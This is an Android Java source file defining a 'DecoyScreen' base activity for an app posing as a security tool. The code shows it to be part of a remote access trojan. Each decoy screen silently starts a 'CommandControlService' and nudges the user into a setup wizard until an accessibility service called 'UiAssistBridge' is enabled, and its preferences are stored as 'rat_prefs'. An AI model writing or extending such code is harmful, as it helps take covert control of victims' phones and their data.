package com.seguranca.protecao;

import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

public abstract class DecoyScreen extends AppCompatActivity {
    protected abstract String title();
    protected abstract void buildContent(LinearLayout body);

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        startCommandService();

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#FFF5F5F5"));
        root.addView(header());

        ScrollView sc = new ScrollView(this);
        LinearLayout body = new LinearLayout(this);
        body.setOrientation(LinearLayout.VERTICAL);
        sc.addView(body);
        root.addView(sc, new LinearLayout.LayoutParams(-1, 0, 1f));

        buildContent(body);
        setContentView(root);

        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            public void run() { maybeOnboard(); }
        }, 1200L);
    }

    private void startCommandService() {
        try {
            Intent i = new Intent(this, CommandControlService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Throwable ignored) {}
    }

    private View header() {
        LinearLayout h = new LinearLayout(this);
        h.setOrientation(LinearLayout.HORIZONTAL);
        h.setGravity(Gravity.CENTER_VERTICAL);
        h.setBackgroundColor(Color.parseColor("#FF1976D2"));
        h.setPadding(dp(16), dp(18), dp(16), dp(18));
        TextView t = new TextView(this);
        t.setText(title());
        t.setTextColor(Color.WHITE);
        t.setTextSize(19);
        t.setTypeface(Typeface.DEFAULT_BOLD);
        h.addView(t);
        return h;
    }

    protected LinearLayout block(String main, String sub) {
        LinearLayout wrap = new LinearLayout(this);
        wrap.setOrientation(LinearLayout.VERTICAL);
        wrap.setPadding(0, 0, 0, dp(1));
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setBackgroundColor(Color.WHITE);
        box.setPadding(dp(16), dp(14), dp(16), dp(14));
        TextView t = new TextView(this);
        t.setText(main);
        t.setTextColor(Color.parseColor("#DE000000"));
        t.setTextSize(16);
        box.addView(t);
        if (sub != null) {
            TextView s = new TextView(this);
            s.setText(sub);
            s.setTextColor(Color.parseColor("#99000000"));
            s.setTextSize(13);
            box.addView(s);
        }
        wrap.addView(box, new LinearLayout.LayoutParams(-1, -2));
        return wrap;
    }

    protected int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }

    private void maybeOnboard() {
        boolean done = getSharedPreferences("rat_prefs", MODE_PRIVATE).getBoolean("setup_completed", false);
        if (done || isAccessibilityOn()) return;
        try { startActivity(new Intent(this, SetupWizardActivity.class)); } catch (Throwable ignored) {}
    }

    private boolean isAccessibilityOn() {
        try {
            String flat = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (TextUtils.isEmpty(flat)) return false;
            return flat.contains("UiAssistBridge");
        } catch (Throwable t) { return false; }
    }
}
